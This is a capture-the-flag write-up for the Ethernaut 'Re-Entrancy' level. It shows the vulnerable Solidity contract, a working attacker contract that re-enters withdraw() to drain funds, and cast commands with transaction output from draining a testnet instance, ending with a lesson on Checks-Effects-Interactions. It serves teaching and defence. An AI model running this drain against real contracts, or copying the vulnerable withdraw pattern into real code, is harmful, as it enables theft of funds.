---
title: "Re-Entrancy"
tags: ["receive", "Check-Effect-Interactions"]
reference: https://ethernaut.openzeppelin.com/level/10
---

# Description

The goal of this level is for you to steal all the funds from the contract.

Things that might help:

- Untrusted contracts can execute code where you least expect it.
- Fallback methods
- Throw/revert bubbling
- Sometimes the best way to attack a contract is with another contract.
- See the "?" page above, section "Beyond the console"

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```

# Solution

1. the challenge name hinted us to call `withdraw` nestedly

```sol
function withdraw(uint256 _amount) public {
    if (balances[msg.sender] >= _amount) {
        (bool result,) = msg.sender.call{value: _amount}(""); // call msg.sender.call() will call withdraw again
        if (result) {
            _amount;
        }
        balances[msg.sender] -= _amount; // balance will not be reducued in correct order
    }
}
```

2. Implement WithdrawAll.sol

```sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IReentrance {
    function balanceOf(address _who) external view returns (uint256 balance);
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract WithdrawAll {
    address target;
    address owner;
    uint256 amount;

    constructor() {
        owner = msg.sender;
    }

    function pwn(address _target) external payable {
        target = _target;
        amount = msg.value;
        IReentrance(target).donate{value: amount}(address(this));
        if (IReentrance(target).balanceOf(address(this)) > 0) {
            IReentrance(target).withdraw(amount);
        }
    }

    receive() external payable {
        if (address(target).balance > 0) {
            IReentrance(target).withdraw(address(target).balance);
        } else {
            owner.call{value: address(this).balance}("");
        }
    }

}
```

3. call `pwn()` until all target balance are drained

```
cast balance 0xbc2F416176b205CDF22236fFADb98831a24B0564  --rpc-url $BASE_SEPOLIA_RPC --ether
0.000003879000004700
tim@tim-virtual-machine ~/g/t/contracts (main)> cast send 0x91895c060e58867B1bFec7AD9960b09e7f7d6Dc2 "pwn(address)" 0xbc2F416176b205CDF22236fFADb98831a24B0564 --value 0.0
00003879000004700ether --rpc-url $BASE_SEPOLIA_RPC --private-key

blockHash            0xe7a9715732b711afab572a96b2c54c4ab7de4f3079c49213e5c14b05f3762067
blockNumber          8929531
contractAddress
cumulativeGasUsed    28136314
effectiveGasPrice    1000030
from                 0xB1473Ba227C4645501E0e05f4839b00ED8320d33
gasUsed              126575
logs                 []
logsBloom            0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root
status               1 (success)
transactionHash      0x07ea4ac3e1402a230aa9d6f58b3b58f3fb020af3d99d0b8e1327aa6fb413e558
transactionIndex     171
type                 2
blobGasPrice
blobGasUsed
to                   0x91895c060e58867B1bFec7AD9960b09e7f7d6Dc2
tim@tim-virtual-machine ~/g/t/contracts (main)> cast balance 0xbc2F416176b205CDF22236fFADb98831a24B0564  --rpc-url $BASE_SEPOLIA_RPC --ether
0.000000000000000000
```

# Lesson Learnt

Use Check-Effect-Interactions Pattern

Most functions will first perform some checks and they should be done first (who called the function, are the arguments in range, did they send enough Ether, does the person have tokens, etc.).

As the second step, if all checks passed, effects to the state variables of the current contract should be made. Interaction with other contracts should be the very last step in any function.

Early contracts delayed some effects and waited for external function calls to return in a non-error state. This is often a serious mistake because of the reentrancy problem explained above.

Note that, also, calls to known contracts might in turn cause calls to unknown contracts, so it is probably better to just always apply this pattern.
